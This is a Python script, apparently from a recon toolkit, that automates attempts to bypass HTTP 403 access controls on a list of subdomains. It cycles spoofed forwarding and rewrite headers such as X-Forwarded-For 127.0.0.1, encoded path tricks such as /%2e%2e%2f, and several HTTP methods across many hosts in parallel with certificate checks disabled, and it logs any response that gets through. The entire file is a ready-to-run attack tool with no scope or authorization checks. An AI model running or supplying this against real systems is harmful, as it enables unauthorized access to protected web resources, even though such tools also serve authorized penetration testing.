#!/usr/bin/env python3
"""
403_bypass.py  (using python-requests as required by project abstract)

Tries:
- header tricks
- path tricks
- multiple HTTP methods
- HTTP/1.1 (requests doesn't support h2, which is fine for methodology)

Outputs:
  <target>/bypass_403/results.json
  <target>/bypass_403/results.txt
"""

import sys
import os
import json
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin

requests.packages.urllib3.disable_warnings()

if len(sys.argv) < 2:
    print("Usage: ./403_bypass.py <project_dir>")
    sys.exit(1)

project_dir = sys.argv[1].rstrip("/")
infile = os.path.join(project_dir, "subdomains", "status", "403_subdomains.txt")
outdir = os.path.join(project_dir, "bypass_403")
os.makedirs(outdir, exist_ok=True)

json_out = os.path.join(outdir, "results.json")
txt_out  = os.path.join(outdir, "results.txt")

# --- Payloads ---
HEADERS = [
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Original-URL", "/"),
    ("X-Rewrite-URL", "/"),
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("X-Forwarded-Proto", "http"),
    ("X-Forwarded-Host", "localhost"),
]

PATH_TRICKS = [
    "/",
    "/.",
    "/./",
    "/%2e/",
    "/%2e%2f",
    "/?ignore",
    "/%2e%2e%2f",
]

METHODS = ["GET", "HEAD", "OPTIONS", "POST"]

TIMEOUT = 6
THREADS = 20


# --- helpers ---

def req(method, url, headers=None):
    try:
        r = requests.request(
            method,
            url,
            headers=headers,
            timeout=TIMEOUT,
            verify=False,
            allow_redirects=False
        )
        return r.status_code, len(r.content or b"")
    except:
        return 0, 0


def normalize_host(h):
    h = h.strip()
    if h.startswith("http://") or h.startswith("https://"):
        h = h.split("://", 1)[1]
    return h.rstrip("/")


# --- main test for one host ---

def test_host(host):
    base = f"https://{host}"
    base_code, _ = req("GET", base)

    # must be 403 to attempt bypass
    if base_code != 403:
        return []

    findings = []

    # Header tricks
    for name, val in HEADERS:
        hdr = {name: val}
        for m in METHODS:
            code, length = req(m, base, hdr)
            if code not in (0, 403):
                findings.append({
                    "host": host,
                    "test": "header",
                    "method": m,
                    "detail": f"{name}: {val}",
                    "url": base,
                    "status": code,
                    "length": length
                })

    # Path tricks
    for p in PATH_TRICKS:
        url = urljoin(base + "/", p.lstrip("/"))
        for m in METHODS:
            code, length = req(m, url)
            if code not in (0, 403):
                findings.append({
                    "host": host,
                    "test": "path",
                    "method": m,
                    "detail": p,
                    "url": url,
                    "status": code,
                    "length": length
                })

    return findings


# --- load hosts ---
if not os.path.isfile(infile):
    print(f"No 403_subdomains file: {infile}")
    sys.exit(0)

hosts = []
with open(infile) as f:
    for line in f:
        h = normalize_host(line)
        if h:
            hosts.append(h)

hosts = list(dict.fromkeys(hosts))  # dedupe


# --- run in threads ---
all_results = []
with ThreadPoolExecutor(max_workers=THREADS) as exe:
    futures = [exe.submit(test_host, h) for h in hosts]
    for f in as_completed(futures):
        res = f.result()
        if res:
            all_results.extend(res)


# --- write outputs ---
with open(json_out, "w") as jf:
    json.dump(all_results, jf, indent=2)

with open(txt_out, "w") as tf:
    if not all_results:
        tf.write("No bypass findings.\n")
    else:
        for r in all_results:
            tf.write(
                f"{r['host']} | {r['test']} | {r['method']} | status={r['status']} | detail={r['detail']} | url={r['url']}\n"
        )

print(f"[+] 403 bypass complete → {outdir}")
